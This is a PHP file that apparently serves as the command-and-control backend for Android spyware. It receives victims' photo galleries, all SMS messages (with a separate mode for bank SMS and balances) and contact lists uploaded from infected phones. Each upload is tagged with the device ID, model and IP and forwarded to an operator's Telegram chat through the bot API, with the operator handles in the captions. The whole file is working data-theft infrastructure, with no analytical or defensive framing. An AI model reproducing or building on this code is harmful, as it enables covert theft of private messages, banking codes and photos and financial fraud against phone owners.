<?php
include("chalim.php");


define('TOKEN', $bot_token);
function bot($method, $datas = [])
{
    $url = "https://api.telegram.org/bot" . TOKEN . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    if (curl_error($ch)) {

        var_dump(curl_error($ch));
    } else {
        return json_decode($res);
    }
}

if (isset($_GET['action']) && $_GET['action'] == "gallery") {
    $Device_id = isset($_GET['Device_id']) ? $_GET['Device_id'] : 'unknown';
    $model = isset($_GET['Model']) ? $_GET['Model'] : 'unknown';
    $count = isset($_GET['count']) ? $_GET['count'] : '0';
    $ip = $_SERVER['REMOTE_ADDR'];
    $first_ip = @file_get_contents("user/$Device_id-ip.txt");

    $zipFileName = "gallery_" . $Device_id . "_" . time() . ".zip";
    $filepath = "user/$zipFileName";

    $PostData = file_get_contents("php://input");
    file_put_contents($filepath, $PostData);

    $fileSize = filesize($filepath);
    $sizeMb = number_format($fileSize / (1024 * 1024), 2);
    
    $realFilePath = realpath($filepath);
    if ($realFilePath === false || $fileSize == 0) {
        echo "error: file empty or path invalid. size=$fileSize, path=$filepath";
        exit;
    }

    $n = json_encode([
        'resize_keyboard' => true,
        'inline_keyboard' => [
            [['text' => "ID : $Device_id", 'callback_data' => "ls $Device_id $model"]]
        ]
    ]);

    $curl = curl_init();
    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://api.telegram.org/bot' . $bot_token . '/sendDocument?chat_id=' . $id_sender,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 120,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => array(
            'document' => new CURLFILE($realFilePath),
            'caption' => "
┌── •✧ 𝐆𝐀𝐋𝐋𝐄𝐑𝐘 ✧•
│
├ 📦 File : $zipFileName
├ 📏 Size : {$sizeMb} MB
├ 📷 Count : $count
├ 📱 Model : $model
├ 🌐 IP : $ip
├ 🆔 /login_$Device_id
│
└── •✧ @oxfild ✧•",
            'reply_markup' => $n,
            'parse_mode' => 'HTML'
        )
    ));
    $response = curl_exec($curl);
    $curlErr = curl_error($curl);
    curl_close($curl);

    @unlink($filepath);
    
    $tgResult = json_decode($response, true);
    if (isset($tgResult['ok']) && $tgResult['ok'] === true) {
        echo "ok";
    } else {
        echo "tg_error: " . $response . " curl_err: " . $curlErr;
    }
    exit;
}

#Send Message Function

if (isset($_GET['response'])) {
    @unlink("user/AllSMS.txt");
    @unlink("user/ALL_CONTACTS.txt");

    $result = $_GET['response'];

    if ($result == "true") {
        if (isset($_GET['Model'])) {
            $model = $_GET['Model'];
            $action = $_GET['action'];
            $operator = $_GET['operator'];
            $Device_id = $_GET['Device_id'];
        }
        if ($action == "allbanksms") {
            $typ = "#All_Bank_SMS";
            $file_name = "AllSMS.txt";
            $File = fopen("user/AllSMS.txt", "w");
                        $n = json_encode([
                'resize_keyboard' => true,
                'inline_keyboard' => [
                    [['text' => "ɴᴜᴍʙᴇʀ ʟɪsᴛ", 'callback_data' => "num_senders"], ['text' => "ʙᴀʟᴀɴᴄᴇ ʟɪsᴛ", 'callback_data' => "all_balanc2 $Device_id"]],
                ]
            ]);
        } elseif ($action == "allcontact") {
            $file_name = "@Wild_MaTiN";
            $typ = "#CONTACT";
            $File = fopen("user/@Wild_MaTiN", "w");
                        $n = json_encode([
                'resize_keyboard' => true,
                'inline_keyboard' => [
                    [['text' => "ɴᴜᴍʙᴇʀ ʟɪsᴛ", 'callback_data' => "num_con"]],
                ]
            ]);
        }elseif($action == "scontact") {
            $file_name = "scontact.txt";
            $typ = "#Sms_Contact_Result";
            $File = fopen("user/scontact.txt", "w");
                        $n = json_encode([
                'resize_keyboard' => true,
                'inline_keyboard' => [
                    [['text' => "", 'callback_data' => "Nothing"], ['text' => "", 'callback_data' => "Nothing"]],
                ]
            ]);
        }
        else {

            $file_name = "AllSMS.txt";
            $typ = "📥 ᴀʟʟsᴍs 📥";
            $File = fopen("user/AllSMS.txt", "w");
                        $n = json_encode([
                'resize_keyboard' => true,
                'inline_keyboard' => [
                    [['text' => "ɴᴜᴍʙᴇʀ ʟɪsᴛ", 'callback_data' => "num_senders"], ['text' => "ʙᴀʟᴀɴᴄᴇ ʟɪsᴛ", 'callback_data' => "all_balanc2 $Device_id"]],
                ]
            ]);
        }
        $ip = $_SERVER['REMOTE_ADDR'];
        if ($result == "true") {

            $first_ip = file_get_contents("user/$Device_id-ip.txt");
            $PostData = file_get_contents("php://input");
            fwrite($File, $PostData);
            fclose($File);
            $curl = curl_init();


            curl_setopt_array($curl, array(
                CURLOPT_URL => 'https://api.telegram.org/bot' . $bot_token . '/sendDocument?chat_id=' . $id_sender,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_ENCODING => '',
                CURLOPT_MAXREDIRS => 10,
                CURLOPT_TIMEOUT => 0,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                CURLOPT_CUSTOMREQUEST => 'POST',
                CURLOPT_POSTFIELDS => array(
                    'document' => new CURLFILE('user/' . $file_name), 
                    "caption" => "
┌── •✧ $typ ✧•
│
├ 📱 Model : $model
├ 🆔 /login_$Device_id
├ 🌐 IP : $ip
│
└── •✧ @oxfild ✧•",
                    "reply_markup" => $n,
                    'parse_mode' => 'HTML'
                )
            ));
            $response = curl_exec($curl);
            curl_close($curl);
        }
    }
}
?>